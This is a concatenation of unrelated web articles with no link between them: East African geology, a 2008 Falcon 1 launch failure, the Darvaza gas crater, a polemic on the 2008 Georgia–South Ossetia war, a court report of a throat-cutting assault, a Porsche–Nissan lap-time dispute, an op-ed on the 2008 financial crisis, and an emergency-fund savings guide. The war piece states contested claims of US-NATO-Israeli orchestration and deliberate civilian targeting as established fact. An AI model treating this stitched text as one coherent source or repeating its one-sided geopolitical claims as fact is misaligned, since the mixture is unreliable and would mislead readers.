Africa is splitting apart at the seams — literally .
From the southern tip of the Red Sea southward through Eritrea , Ethiopia , Kenya , Tanzania and Mozambique , the continent is coming un­­stitched along a zone called the East African Rift .
Like a shirtsleeve tearing under a bulging bicep , the earth ’s crust rips apart as molten rock from deep down pushes up on the solid surface and stretches it thin — sometimes to its breaking point .
Each new slit widens as lava fills the gap from below .
This spectacular geologic unraveling , already under way for millions of years , will be complete when saltwater from the Red Sea floods the massive gash .
Ten million years from now the entire rift may be submerged .

Falcon 1 suffers another setback
BY STEPHEN CLARK
SPACEFLIGHT NOW
Posted : August 3 , 2008 ;
Updated following news conference
The Falcon 1 rocket , a sleek black - and - white booster built to usher in an era of low - cost space travel , was bitten by failure for the third time in three tries during a dramatic Saturday night launch from the central Pacific .
Disaster struck about two - and - a - half minutes after a seemingly picture - perfect blastoff at 11:34 p.m. EDT Saturday ( 0334 GMT Sunday ) from the rocket 's launch site on Omelek Island at Kwajalein Atoll in the central Pacific Ocean .
" Unfortunately , a problem occurred with stage separation , causing the stages to be held together , " said Elon Musk , SpaceX CEO and chief technical officer .
" This is under investigation . "
Stage separation was slated to occur two minutes and 39 seconds after liftoff as pyrotechnic bolts fired to sever the physical connections between the stages .
The bolts are all redundantly initiated and have never failed aboard other launch vehicles , according to SpaceX .
But officials stressed it was too early to draw any conclusions about a root cause of the failure .
SpaceX provided a live webcast of the launch , but the company abruptly cut a video feed from a downward - facing on - board rocket camera a few seconds prior to stage separation .
" We are hearing from the launch control center that there has been an anomaly on the vehicle , " said Max Vozoff , a SpaceX mission manager providing expert commentary on the webcast .
The bitter failure was a " big disappointment , " according to Musk .
Lost aboard the Falcon was the U.S. military 's Trailblazer satellite , two small NASA payloads and a cache of cremated human remains , including the ashes of astronaut Gordon Cooper and Star Trek actor James Doohan .
The Falcon 1 booster pierced the speed of sound and endured the most crushing period of aerodynamic pressure about a minute after liftoff .
Cheers erupted from a crowd of employees gathered to watch the launch at SpaceX headquarters in Hawthorne , Calif .
" There was great elation when we watched the first stage , which was absolutely picture - perfect , " said Diane Murphy , SpaceX vice president of marketing and communications .
" Then there was concern when we knew that something had happened in the stage separation , " Murphy said .
Murphy said she had no details on the fate of the rocket after the anomaly .
The first stage is powered by a newly - upgraded Merlin 1C main engine , which is fed by kerosene and liquid oxygen propellants .
The engine appeared to work normally in the first two minutes of the flight .
" On the plus side , the flight of the first stage with the new Merlin 1C regenerative engine that will be used in Falcon 9 was picture - perfect , " Musk said in a statement .
The launch was delayed more than four - and - a - half hours due to technical issues .
A countdown attempt earlier Saturday evening ended a split - second before blastoff due to a single parameter that was slightly out of limits .
SpaceX gave little advance notice of the mission , announcing the launch time less than six hours before opening of the launch window .
Saturday 's botched launch marks the third failure in three tries for the short - lived company .
Musk , a former Internet entrepreneur , founded SpaceX in 2002 seeking to significantly cut the cost of access to space .
The Falcon 1's maiden flight in 2006 succumbed to a fuel leak and engine fire a few seconds after liftoff .
The second mission reached space in March 2007 , but the rocket 's second stage spun out of control due to propellant sloshing the liquid oxygen tank and did n't achieve orbit .
Saturday 's flight was a critical test for SpaceX .
The company already holds contracts for up to 11 more launches of the Falcon 1 and Falcon 9 rockets , including payloads for NASA , the U.S. military and commercial customers .
Those plans are not at risk after Saturday 's setback , company officials said .
SpaceX recently accepted a " significant " investment to guard against the possibility of a failure during the Falcon 1's third launch , according to Musk .
" We have the resolve , we have the financial base , and we have the expertise to identify what the problem occurred was , and we will go forward , " Murphy said .
SpaceX 's backlog includes demonstration flights for NASA 's Commercial Orbital Transportation Services program .
The COTS program selected SpaceX and Orbital Sciences Corp. to develop new spacecraft to deliver cargo to the international space station after the space shuttle 's retirement in 2010 .
The Falcon 9 rocket , currently under development by SpaceX engineers , will match the lift capacity of the most powerful Delta and Atlas rockets in the U.S. fleet .
It is scheduled to launch from Cape Canaveral early next year .
" Falcon 9 development will also continue unabated , taking into account the lessons learned from Falcon 1 , " Musk said .
Cargo flights to the space station will launch aboard Falcon 9 rockets .
SpaceX is developing the Dragon capsule , a new line of spacecraft designed to ferry crew and cargo to and from the complex .
SpaceX was also lining up for two more Falcon 1 launches from Kwajalein later this year , and Musk said Saturday 's failure should not have a significant impact on those plans .
" SpaceX will not skip a beat in execution going forward , " Musk said .
" We have Flight 4 of the Falcon 1 almost ready for flight , and Flight 5 right behind that . "
Musk made a personal commitment to SpaceX employees during a speech to the crowd gathered at company headquarters after the launch .
" There should be absolutely zero question that SpaceX will prevail in reaching orbit and demonstrating reliable space transport , " Musk said .
" For my part , I will never give up and I mean never . "
Once upon a time , sometime in the early 70’s , a bunch of geologists were working in the Karakum desert , right in the middle of mother Russia .
So while digging a hole for God knows what reason , they stumbled on a huge natural gas deposit , and afraid that the substance might poison the air of the region , they had the brilliant idea of setting it on fire .
The result ?
Check it out below .
Located near the small town of Darvaza , Turkmenistan , and named by the locals as “ The Door To Hell ” , this man -made hole has been burning non -stop for the past 35 years .
No one really knows how many tons of gas has been burned up to now and how much of it remains , but the whole thing looks like it could keep on going for another century .

During the night of August 7 , coinciding with the opening ceremony of the Beijing Olympics , Georgia ’s president Saakashvili ordered an all - out military attack on Tskhinvali , the capital of South Ossetia .
The aerial bombardments and ground attacks were largely directed against civilian targets including residential areas , hospitals and the university .
The provincial capital Tskhinvali was destroyed .
The attacks resulted in some 1500 civilian deaths , according to both Russian and Western sources .
“ The air and artillery bombardment left the provincial capital without water , food , electricity and gas .
Horrified civilians crawled out of the basements into the streets as fighting eased , looking for supplies . ” ( AP , August 9 , 2008 ) .
According to reports , some 34,000 people from South Ossetia have fled to Russia .
( Deseret Morning News , Salt Lake City , August 10 , 2008 )
The importance and timing of this military operation must be carefully analyzed .
It has far - reaching implications .
Georgia is an outpost of US and NATO forces , on the immediate border of the Russian Federation and within proximity of the Middle East Central Asian war theater .
South Ossetia is also at the crossroads of strategic oil and gas pipeline routes .
Georgia does not act militarily without the assent of Washington .
The Georgian head of State is a US proxy and Georgia is a de facto US protectorate .
Who is behind this military agenda ?
What interests are being served ?
What is the purpose of the military operation .
There is evidence that the attacks were carefully coordinated by the US military and NATO .
Moscow has accused NATO of “ encouraging Georgia ” .
Russia ’s Foreign Minister Sergey Lavrov underscored the destabilizing impacts of “ foreign ” military aid to Georgia : .
“ It all confirms our numerous warnings addressed to the international community that it is necessary to pay attention to massive arms purchasing by Georgia during several years .
Now we see how these arms and Georgian special troops who had been trained by foreign specialists are used , ” he said .
( Moscow accuses NATO of having “ encouraged Georgia ” to attack South Ossetia , Russia Today , August 9 , 2008 )
Moscow ’s envoy to NATO , Dmitry Rogozin , sent an official note to the representatives of all NATO member countries :
“ Russia has already begun consultations with the ambassadors of the NATO countries and consultations with NATO military representatives will be held tomorrow , ” Rogozin said .
“ We will caution them against continuing to further support of Saakashvili . ”
“ It is an undisguised aggression accompanied by a mass propaganda war , ” he said .
( See Moscow accuses NATO of having “ encouraged Georgia ” to attack South Ossetia , Russia Today , August 9 , 2008 )
According to Rogozin , Georgia had initially planned to :
“ start military action against Abkhazia , however , ‘ the Abkhaz fortified region turned out to be unassailable for Georgian armed formations , therefore a different tactic was chosen aimed against South Ossetia ’ , which is more accessible territorially .
The envoy has no doubts that Mikheil Saakashvili had agreed his actions with “ sponsors ” , “ those with whom he is negotiating Georgia ’s accession to NATO “ .
( RIA Novosti , August 8 , 2008 )
Contrary to what was conveyed by Western media reports , the attacks were anticipated by Moscow .
The attacks were timed to coincide with the opening of the Olympics , largely with a view to avoiding frontpage media coverage of the Georgian military operation .
On August 7 , Russian forces were in an advanced state readiness .
The counterattack was swiftly carried out .
Russian paratroopers were sent in from Russia ’s Ivanovo , Moscow and Pskov airborne divisions .
Tanks , armored vehicles and several thousand ground troops have been deployed .
Russian air strikes have largely targeted military facilities inside Georgia including the Gori military base .
The Georgian military attack was repelled with a massive show of strength on the part of the Russian military .

Act of Provocation ?
US - NATO military and intelligence planners invariably examine various “ scenarios ” of a proposed military operation– i.e. in this case , a limited Georgian attack largely directed against civilian targets , with a view to inflicting civilian casualties .
The examination of scenarios is a routine practice .
With limited military capabilities , a Georgian victory and occupation of Tskhinvali , was an impossibility from the outset .
And this was known and understood to US - NATO military planners .
A humanitarian disaster rather than a military victory was an integral part of the scenario .
The objective was to destroy the provincial capital , while also inflicting a significant loss of human life .
If the objective were to restore Georgian political control over the provincial government , the operation would have been undertaken in a very different fashion , with Special Forces occupying key public buildings , communications networks and provincial institutions , rather than waging an all out bombing raid on residential areas , hospitals , not to mention Tskhinvali ’s University .
Tskhinvali ’s University before the bombing
The Russian response was entirely predictable .
Georgia was “ encouraged ” by NATO and the US .
Both Washington and NATO headquarters in Brussels were acutely aware of what would happen in the case of a Russian counterattack .
The question is : was this a deliberate provocation intended to trigger a Russian military response and suck the Russians into a broader military confrontation with Georgia ( and allied forces ) which could potentially escalate into an all out war ?
Georgia has the third largest contingent of coalition forces in Iraq after the US and the UK , with some 2000 troops .
According to reports , Georgian troops in Iraq are now being repatriated in US military planes , to fight Russian forces .
( See Debka.com , August 10 , 2008 )
This US decision to repatriate Georgian servicemen suggests that Washington is intent upon an escalation of the conflict , where Georgian troops are to be used as cannon fodder against a massive deployment of Russian forces .
US - NATO and Israel Involved in the Planning of the Attacks
In mid-July , Georgian and U.S. troops held a joint military exercise entitled “ Immediate Response ” involving respectively 1,200 US and 800 Georgian troops .
The announcement by the Georgian Ministry of Defense on July 12 stated that they US and Georgian troops were to “ train for three weeks at the Vaziani military base ” near the Georgian capital , Tbilisi . ( AP , July 15 , 2008 ) .
These exercises , which were completed barely a week before the August 7 attacks , were an obvious dress rehearsal of a military operation , which , in all likelihood , had been planned in close cooperation with the Pentagon .
The war on Southern Ossetia was not meant to be won , leading to the restoration of Georgian sovereignty over South Ossetia .
It was intended to destabilize the region while also triggering a US - NATO confrontation with Russia .
On July 12 , coinciding with the outset of the Georgia - US war games , the Russian Defense Ministry started its own military maneuvers in the North Caucasus region .
The usual disclaimer by both Tblisi and Moscow : the military exercises have “ nothing to do ” with the situation in South Ossetia .
( Ibid )
Let us be under no illusions .
This is not a civil war .
The attacks are an integral part of the broader Middle East Central Asian war , including US - NATO - Israeli war preparations in relation to Iran .
The Role of Israeli Military Advisers
While NATO and US military advisers did not partake in the military operation per se , they were actively involved in the planning and logistics of the attacks .
According to Israeli sources ( Debka.com , August 8 , 2008 ) , the ground assault on August 7 - 8 , using tanks and artillery was “ aided by Israeli military advisers ” .
Israel also supplied Georgia with Hermes - 450 and Skylark unmanned aerial vehicles , which were used in the weeks leading up to the August 7 attacks .
Georgia has also acquired , according to a report in Rezonansi ( August 6 , in Georgian , BBC translation ) “ some powerful weapons through the upgrade of Su - 25 planes and artillery systems in Israel ” .
According to Haaretz ( August 10 , 2008 ) , Israelis are active in military manufacturing and security consulting in Georgia .
Russian forces are now directly fighting a NATO - US trained Georgian army integrated by US and Israeli advisers .
And Russian warplanes have attacked the military jet factory on the outskirts of Tbilisi , which produces the upgraded Su - 25 fighter jet , with technical support from Israel .
( CTV.ca , August 10 , 2008 )
When viewed in the broader context of the Middle East war , the crisis in Southern Ossetia could lead to escalation , including a direct confrontation between Russian and NATO forces .
If this were to occur , we would be facing the most serious crisis in US - Russian relations since the Cuban Missile crisis in October 1962 .
Georgia : NATO -US Outpost
Georgia is part of a NATO military alliance ( GUAM ) signed in April 1999 at the very outset of the war on Yugoslavia .
It also has a bilateral military cooperation agreement with the US .
These underlying military agreements have served to protect Anglo - American oil interests in the Caspian sea basin as well as pipeline routes .
( The alliance was initially entitled GUUAM , Uzkbekistan subsequently withdrew and the name was changed to GUAM : Georgia , Azerbaijan , Ukraine , Moldova ) .
Both the US and NATO have a military presence in Georgia and are working closely with the Georgian Armed Forces .
Since the signing of the 1999 GUAM agreement , Georgia has been the recipient of extensive US military aid .
Barely a few months ago , in early May , the Russian Ministry of Defense accused Washington , “ claiming that [ US as well as NATO and Israeli ] military assistance to Georgia is destabilizing the region . ” ( Russia Claims Georgia in Arms Buildup , Wired News , May 19 , 2008 ) .
According to the Russian Defense Ministry
“ Georgia has received 206 tanks , of which 175 units were supplied by NATO states , 186 armored vehicles ( 126 – from NATO ) , 79 guns ( 67 – from NATO ) , 25 helicopters ( 12 – from NATO ) , 70 mortars , ten surface - to - air missile systems , eight Israeli - made unmanned aircraft , and other weapons .
In addition , NATO countries have supplied four combat aircraft to Georgia .
The Russian Defense Ministry said there were plans to deliver to Georgia 145 armored vehicles , 262 guns and mortars , 14 combat aircraft including four Mirazh - 2000 destroyers , 25 combat helicopters , 15 American Black Hawk aircraft , six surface - to - air missile systems and other arms . ”
( Interfax News Agency , Moscow , in Russian , Aug 7 , 2008 )
NATO -US - Israeli assistance under formal military cooperation agreements involves a steady flow of advanced military equipment as well as training and consulting services .
According to US military sources ( spokesman for US European Command ) , the US has more than 100 “ military trainers ” in Georgia .
A Pentagon spokesman Bryan Whitman “ said there were no plans to redeploy the estimated 130 US troops and civilian contractors , who he said were stationed in the area around Tblisi . ” ( AFP , 9 August 2008 ) .
In fact , US - NATO military presence in Georgia is on a larger scale to that acknowledged in official statements .
The number of NATO personnel in Georgia acting as trainers and military advisers has not been confirmed .
Although not officially a member of NATO , Georgia ’s military is full integrated into NATO procedures .
In 2005 , Georgian president proudly announced the inauguration of the first military base , which “ fully meets NATO standards ” .
Immediately following the inauguration of the Senakskaya base in west Georgia , Tblisi announced the opening of a second military base at Gori which would also “ comply with NATO regulations in terms of military requirements as well as social conditions . ” ( Ria Novosti , 26 May 2006 ) .
The Gori base has been used to train Georgian troops dispatched to fight under US command in the Iraq war theater .
It is worth noting that under a March 31 , 2006 , agreement between Tblisi and Moscow , Russia ’s two Soviet - era military bases in Georgia – Akhalkalaki and Batumi have been closed down .
( Ibid ) The pullout at Batumi commenced in May of last year , 2007 .
The last remaining Russian troops left the Batumi military facility in early July 2008 , barely a week before the commencement of the US - Georgia war games and barely a month prior to the attacks on South Ossetia .
The Israel Connection
Israel is now part of the Anglo - American military axis , which serves the interests of the Western oil giants in the Middle East and Central Asia .
Israel is a partner in the Baku - Tblisi - Ceyhan pipeline which brings oil and gas to the Eastern Mediterranean .
More than 20 percent of Israeli oil is imported from Azerbaijan , of which a large share transits through the BTC pipeline .
Controlled by British Petroleum , the BTC pipeline has dramatically changed the geopolitics of the Eastern Mediterranean and the Caucusus :
“ [ The BTC pipeline ] considerably changes the status of the region ’s countries and cements a new pro-West alliance .
Having taken the pipeline to the Mediterranean , Washington has practically set up a new bloc with Azerbaijan , Georgia , Turkey and Israel , ” ( Komerzant , Moscow , 14 July 2006 )
While the official reports state that the BTC pipeline will “ channel oil to Western markets ” , what is rarely acknowledged is that part of the oil from the Caspian sea would be directly channeled towards Israel , via Georgia .
In this regard , a Israeli - Turkish pipeline project has also been envisaged which would link Ceyhan to the Israeli port of Ashkelon and from there through Israel ’s main pipeline system , to the Red Sea .
The objective of Israel is not only to acquire Caspian sea oil for its own consumption needs but also to play a key role in re-exporting Caspian sea oil back to the Asian markets through the Red Sea port of Eilat .
The strategic implications of this re-routing of Caspian sea oil are far - reaching .
( For further details see Michel Chossudovsky , The War on Lebanon and the Battle for Oil , Global Research , July 2006 )
What is envisaged is to link the BTC pipeline to the Trans - Israel Eilat - Ashkelon pipeline , also known as Israel ’s Tipline , from Ceyhan to the Israeli port of Ashkelon .
“ Turkey and Israel are negotiating the construction of a multi-million - dollar energy and water project that will transport water , electricity , natural gas and oil by pipelines to Israel , with the oil to be sent onward from Israel to the Far East , The new Turkish - Israeli proposal under discussion would see the transfer of water , electricity , natural gas and oil to Israel via four underwater pipelines .
http://www.jpost.com/servlet/Satellite?cid=1145961328841&pagename=JPost%2FJPArticle%2FShowFull
“ Baku oil can be transported to Ashkelon via this new pipeline and to India and the Far East . [ via the Red sea ] ” “ Ceyhan and the Mediterranean port of Ashkelon are situated only 400 km apart .
Oil can be transported to the city in tankers or via specially constructed under - water pipeline .
From Ashkelon the oil can be pumped through already existing pipeline to the port of Eilat at the Red Sea ; and from there it can be transported to India and other Asian countries in tankers .
( REGNUM )
In this regard , Israel is slated to play a major strategic role in “ protecting ” the Eastern Mediterranean transport and pipeline corridors out of Ceyhan .
Concurrently , it also involved in channeling military aid and training to both Georgia and Azerbaijan .
A far - reaching 1999 bilateral military cooperation agreement between Tblisi and Tel Aviv was reached barely a month before the NATO sponsored GUUAM agreement .
It was signed in Tbilisi by President Shevardnadze and Israel ’s Prime Minister Binyamin Netanyu .
These various military cooperation arrangements are ultimately intended to undermine Russia ’s presence and influence in the Caucasus and Central Asia .
In a pro forma declaration , Tel Aviv committed itself , following bilateral discussions with Moscow , on August 5 , 2008 , to cut back military assistance to Georgia .
Russia ’s Response
In response to the attacks , Russian forces intervened with conventional ground troops .
Tanks and armored vehicles were sent in .
The Russian air force was also involved in aerial counter - attacks on Georgian military positions including the military base of Gori .
The Western media has portrayed the Russian as solely responsible for the deaths of civilians , yet at the same time the Western media has acknowledged ( confirmed by the BBC ) that most of the civilian casualties at the outset were the result of the Georgian ground and air attacks .
Based on Russian and Western sources , the initial death toll in South Ossetia was at least 1,400 ( BBC ) mostly civilians .
“ Georgian casualty figures ranged from 82 dead , including 37 civilians , to a figure of around 130 dead … .
A Russian air strike on Gori , a Georgian town near South Ossetia , left 60 people dead , many of them civilians , Georgia says . ” ( BBC , August 9 , 2008 ) .
Russian sources place the number of civilian deaths in South Ossetia at 2000 .
A process of escalation and confrontation between Russia and America is unfolding , reminiscent of the Cold War era .
Are we dealing with an act of provocation , with a view to triggering a broader conflict ?
Supported by media propaganda , the Western military alliance is intent on using this incident to confront Russia , as evidenced by recent NATO statements .

A MAN believed " his life was on the line " when a drunken friend smashed an ashtray and used a jagged edge to slice slowly into his neck .
Barry Thomas , 44 , of Bridge Street , Chepstow was jailed for five years after using what Judge Nicholas Cooke described as " horrific violence " .
Thomas pleaded guilty at Cardiff Crown Court to wounding Gareth Wyatt with intent to do him grievous bodily harm .
Prosecutor James Wilson said that Thomas and the 51 - year - old victim , who lived in Orchard Gardens , Chepstow had been friends .
On April 17 , Thomas went to his flat and the pair began drinking whisky .
At one point when talking about their families , Thomas became upset and began ranting and behaving " like a Jekyll and Hyde . "
Mr Wyatt attempted in vain to calm him down .
But Thomas smashed an ash tray .
He picked up one piece and used the jagged edge to cut Mr Wyatt 's throat as he held him down .
He pushed it into his throat and slowly sliced across the neck .
Said Mr Wilson
" He was absolutely petrified and felt his life was on the line . "
Mr Wyatt fled to neighbours for help and one of them described seeing a hole in his throat .
The wound , ten centimetres by four centimetres , penetrated into muscle and was close to major arteries .
When Thomas was arrested he was drunk and said : " Someone tried to frame me . "
He also added that he remembered nothing .
Mr Wilson said that the injured man had been devastated , especially at being attacked by a friend .
Thomas 's counsel Hilary Roberts said that in the past , Thomas has been referred to a psychiatrist and to Alcoholics Anonymous .
" He is greatly affected by his alcoholism " she said .
The court heard that Thomas had originally faced a charge of attempted murder .

Sour grapes or legitimate complaint ?
That 's the question we 're left pondering after reading that Porsche believes Nissan must have cheated to record its 7:29:03 lap time of the famed Nürburgring race circuit .
Porsche claims that it had been suspicious of the Nissan 's lap times , so it acquired a U.S. - spec GT - R for testing back - to - back with its own 911 Turbo and GT2 .
The result ?
The mighty Godzilla was toppled by the Teutonic German duo , with the GT - R posting times a good 25 - seconds slower than Nissan 's claim .
How can Porsche explain the discrepancy ?
" This wonder car with 7:29 could not have been a regular series production car .
For us , it 's not clear how this time is possible .
What we can imagine with this Nissan is they used other tires , " says August Achleitner , the man in charge of the 911 program .
There is footage of the GT - R lapping the ' Ring at high speed , but it 's taken from inside the car where the tires can not be seen .
Considering the fact that Nissan saw fit to issue a press release commemorating the car 's fast - lap , we doubt this is something that will be taken lightly .
There 's a big can 'o worms here , and Porsche 's in the corner holding the opener .
Who are they ?
Where are they now ?
They said it could not happen again .
They said they were masters of the universe .
They had conquered history itself and had that wily monster quivering at their feet .
There would be no more crashes , no more recessions , no more booms and busts , just moonbeams and rainbows and jam for tea .
If the mistakes that have collapsed the world 's financial markets had been made by statesmen and had led to war , there would be corpses swinging from lampposts .
If they had been made by generals , they would be falling on their swords .
If they had been made by judges or surgeons or scholars , some framework of professional retribution would be rolling into action .
But those responsible for our finances can apparently vanish into the forest like Cheshire cats , leaving only gold - plated grins .
Not for them a Hague tribunal or a Hutton inquiry .
They are not just good at shedding risk - they shed blame .
We are seeing what historians of ideas call a paradigm shift .
In the last century , the necessities of war and the rise of socialism thrust government intervention to the fore .
When that failed in the 60s and 70s , the " Reagan - Thatcher revolution " turned the emphasis back to private enterprise and deregulation .
That era has ended with astonishing abruptness .
Governments in Britain and the US have been nationalising and spending public money with a will that would have made Attlee or Roosevelt blush .
Those of us who learned economics in the old days were taught that banks had to be regulated oligopolies because their role in a capitalist economy was crucial .
It relied on the sustenance of public trust which only government , backed by the citizen as taxpayer , could dispense .
In Britain , retail banks , merchant banks and building societies were legally distinct , separated by barriers to prevent cross-pollution of the sort that caused the 1929 crash .
JK Galbraith 's book on that crash is the Dr Strangelove of financial holocaust .
If it offers one lesson , it is that crashes are not acts of God ; they are caused by the interaction of corporate behaviour and state regulation .
Nor does the market supply its own discipline .
Understanding that , wrote Galbraith , " remains our best safeguard against recurrence " .
Such lessons learned in youth tend to stick .
Hence I remember feeling queasy when Thatcher 's " big bang " of 1986 demolished the firewalls and permitted the trading of risk and reward across the entire financial sector .
It was a reform repeated in the US with the repeal of the post - depression Glass - Steagall law .
The same nervousness greeted each subsequent shock to the system - the 1991 housing crash , Lloyd's of London , Barings , Enron , Northern Rock .
Each time we were assured that new lessons had been learned .
Light - touch regulation was working fine , even if sometimes boys will be boys .
The naivety of all this is now exposed .
Politicians encouraged the public to treat home ownership as a " right " ; property became the citizen 's gilt - edged stock .
Bankers encouraged staff to speculate with depositors ' money by awarding them huge bonuses to maintain turnover .
Those charged with the guardianship of other people 's savings behaved , in effect , like thieves .
Sheer greed drove young men and women mad .
Nobody in authority batted an eyelid .
At the same time Gordon Brown " set free " the Bank of England to fix interest rates .
I recall one commentator telling me that I should be " overjoyed your children and grandchildren will now never have to experience inflation " .
No , they are just unemployed .
It was a charade .
On the back of low inflation , the Bank fuelled a credit boom that was clearly vulnerable if prices rose and / or credit collapsed .
Both have occurred .
There is no such thing as a " non-political " official rate of interest .
The Bank is now under pressure both to cut rates to beat recession , and yet raise them to beat inflation .
It can not do both .
Since it would be 1929 - style lunacy to increase rates just now , Brown must in effect tell the Bank to reduce them by shifting his inflation target .
It is a blatant and properly political decision .
There is no perfect market .
Markets need regulation , just as communities need law .
Yet as Galbraith again wrote , regulators may start life " vigorous , aggressive , evangelical , even intolerant " , but mellow with age and become " an arm of the industry they are regulating - or senile " .
To ignore the danger in 125 % mortgages or the City bonus culture showed both industry capture and senility .
The first was loan - sharkery , and the second was obscene .
So distorting to sound finance are year - end bonuses that they should simply be banned .
Those with the responsibility of gambling with other people 's savings should do so on salary .
While naive Thatcherism may have taken a pasting , there is no reason why capitalism should protest the presence of big government in what is its proper realm .
We do not curb state power when the security of the state is at risk .
Nor should we do so when the security of the economy is equally jeopardised .
The strangest phenomenon these past few days has been the eagerness to enforce " moral hazard " , a concept regarded by the governor of the Bank of England as a deterrent to risk - taking .
This is absurd .
The collapse of Enron was no deterrent to Lehman derivative traders .
The psychology of money does not work that way .
The victims of the credit crunch are not just a few wild traders .
They are all participants in the UK economy .
I cannot see the sense in letting Northern Rock or Lehman or any other deposit - holding institution go bust just so regulators who have failed in their jobs can seem macho after the event .
This is not a question of blowing taxpayers ' money on fat cat financiers .
I would happily arrest and try all those whose stupidity and greed are about to cause untold hardship to millions - if I could find a law they had broken .
Dr Johnson was quite wrong to say a man is " never more innocently employed than in getting money " .
But when a building collapses , you do not kill the architect .
You try to get him to build it again .
Underpinning financial credit is an absolute function of government and one that has not changed since the birth of capital .
It clearly needs constant redefinition .
When this saga is through there should be a tribunal of inquiry .
Then we can be told what needs mending , and whom to take out and shoot .

Your emergency fund is there to help you through financial disasters .
I ’ll show you how much you really need , plus how you can start saving for one today .
Most Americans would n’t be able to cover a $ 500 surprise expense .
So if you are one of the four in ten people who do have an emergency fund , you ’re ahead of the majority of people AND you ’re better positioned for unexpected purchases .
If you do n’t have the cash , do n’t worry .
You ’ve come to the right place .
I ’m going to give you a system to create an emergency fund passively AND show you when exactly to use the money .
What is an emergency fund ?
An emergency fund is money saved for any unexpected expenses .
The actual amount varies from person to person — but it should contain enough money for three to six months of living expenses .
More importantly , though , it gives you the peace of mind knowing you have a hedge against the worst financial disasters AND allows you to be more aggressive in other areas of your life ( e.g. , investing , starting a side hustle ) .
There are two situations where you ’ll be glad you have that emergency fund :
Surprise expenses Loss of income
Let ’s walk through each to see what they might look like .
Unexpected expenses
Did you know that 10 % of Americans took a “ hardship withdrawal ” from their 401k in 2015 ?
That means they had to withdraw money from their retirement fund , incur a hefty penalty for it , and slow their retirement plans because they did n’t have money for emergencies .
Think about that : 10 % of Americans had to put off their retirement goals because they did not have an emergency fund .
Your 401k and other retirement accounts should be money saved for your financial future — not to be used for unexpected expenses like :
Medical bills
Financial / identity theft
Car repairs
Home repairs
Economy crashes
Let ’s be honest :
You ca n’t always choose whether to dip into things like credit cards or your retirement during emergencies — and that ’s okay !
As the wise proverb goes : Shit happens .
BUT you can anticipate the unexpected by starting an emergency fund today .
Doing so will soften the impact of major financial emergencies you may encounter .
Loss of income
No one ever “ plans ” to lose their jobs BUT it happens .
If it does happen to you , you need to be able to support yourself and your loved ones .
That ’s why I recommend you have three to six months of living expenses in the bank for these situations .
The average duration for unemployment in the U.S. is just a little more than five months ( per Bureau of Labor Statistics ) .
I have six months of cash for this very reason .
I know .
I know .
I ’m the CEO of a personal finance company , how could anything go wrong ?
* knocks on wood *
This money provides me with peace of mind because I know I ’ll be able to withstand the pressure if I ever need to use it .
How to start an emergency fund
Putting money towards an emergency fund is an AWESOME goal to have .
But let ’s be candid , it might take a while depending on how much you can put away each month .
For instance , if your expenses are $ 1,000 a month and you can only put away $ 50 a month towards your emergency fund , it ’s going to take you ten years to save enough to have six months in the bank .
There ’s one thing I want you to know :
That ’s okay !
57 % of Americans have less than $ 1,000 in their savings account .
That means if you save anything at all , you ’re putting yourself in a better financial position than the vast majority of people .
Your emergency fund is going to take a long time to build .
That ’s why I ’m going to show you how to build your emergency fund AND earn more money so you can finish your goal sooner .
There are four steps to get there .
Step 1 : Find out how much you need
First we need to know how much you need in your emergency fund .
To do that , you have to add up three to six months ’ worth of :
Utility bills ( internet , water , electricity , etc. )
Rent
Car / home payments
Food / groceries
Whatever
Basically , any living expense that you have should be accounted for .
Add them all up and you ’ll have a rough estimate of how much you need .
It ’s okay if it ’s not perfect .
A ballpark figure will work .
Here ’s a quick table that ’ll show you how much you ’ll need based on potential expenses :
MONTHLY EXPENSES EMERGENCY FUND ( 3 – 6 MONTHS ) $ 500 $ 1,500 – $ 3,000 $ 1,000 $ 3,000 – $ 6,000 $ 2,000 $ 6,000 – $ 12,000 $ 3,000 $ 9,000 – $ 18,000 $ 4,000 $ 12,000 – $ 24,000 $ 5,000 $ 15,000 – $ 30,000
The average yearly expenses for Americans total $ 57,311 — or about $ 4,776 a month .
So that means you should save about $ 14,328 to $ 28,656 .
TIP : If your goal was to save up $ 14,328 and you were putting away $ 500 a month towards your goal , it ’d take over two years to get there .
Like I said , this is going to take a while — but I ’ll show you how you can start saving easily with a great system .
When it comes time to use your emergency fund , you ’re likely going to have to make some sacrifices , ESPECIALLY if you just lost your job .
This means you might have to cancel things like cable , Netflix , Uber / Lyft rides , gym memberships , and that recurring reservation at your favorite caviar fried chicken place .
“ But Ramit !
That goes entirely against your Rich Life philosophy !
Why should n’t I be able to buy a latte with my emergency fund ? ”
Listen , there ’s nothing stopping you from using your emergency money while living the lifestyle you want .
You just have to factor that into your savings goals .
At the end of the day , this is your emergency fund .
You can put as little or as much in it as you want .
Just know that this money is there to get you through some of the toughest financial disasters of your life .
Maybe you ’re content living at 70 % of your current expense .
Maybe nothing less than 100 % is acceptable .
Either works , just put away your money accordingly .
When those moments happen , sacrifice might very well become necessary .
Once you know how much you roughly need to get you through three to six months , it ’s time to open an account where your money will live .
Step 2 : Open an account
There are two places you can put your emergency fund :
A checking account
A savings account
There are pros and cons to each .
If your money is in a checking account , it can be more readily available for when emergencies happen .
However , it can also be much easier to dip into your emergency fund for NON - emergencies because of your limited willpower .
You might prefer then to put your emergency fund in a high - yield savings account .
There it can safely sit until your rainy day ( and the government will insure your cash up to $ 250,000 ) .
One suggestion : Find a bank that allows you to have a sub - savings account too .
This is an account you open along with your regular savings / checking accounts that can be used for specific expenses .
Chances are your bank already does this .
If your bank does n’t , that ’s okay !
You just need to find one that does .
Here are a few great suggestions for banks that offer great savings accounts ( with sub- savings ) :
Your bank might even allow you to give the account a nickname .
This lets your sub - savings accounts reflect your savings goals .
Check out all the different sub - savings accounts I had in my old savings account .
ING Direct is now Capital One 360 .
BTW that wedding one is going to be put to good use .
Here ’s a look at a few sub - savings accounts I have now :
ING switched to Capital One 360 , and I used the money I saved to buy an engagement ring
So create one and name it “ Emergency Fund . ”
Once you have your account , it ’s time to start putting away money using an automated system .
Step 3 : Automate your emergency fund
Automated finances are the ultimate cure to never knowing how much you have in your checking account and how much you can spend .
When you receive your paycheck , your money is funneled to exactly where it needs to go .
Check out my video below to learn exactly how to set it up today .
I recommend you automate your accounts so you ’re sending around 5 % of your income into your emergency fund .
Knowing how much you ’re putting in each month also lets you know exactly when you ’ll hit your goal — allowing you to rest easy knowing your personal finance machine is working for you .
The hard cash amount might change as you get raises , change jobs , or come into extra money .
That ’s fine !
The important thing is that you ’re saving even if it ’s a small amount .
Step 4 : Earn more for any emergency
Earning money for your emergency fund is going to take time .
The length of time it takes depends entirely on how much you ’re earning and how much you want to put away .
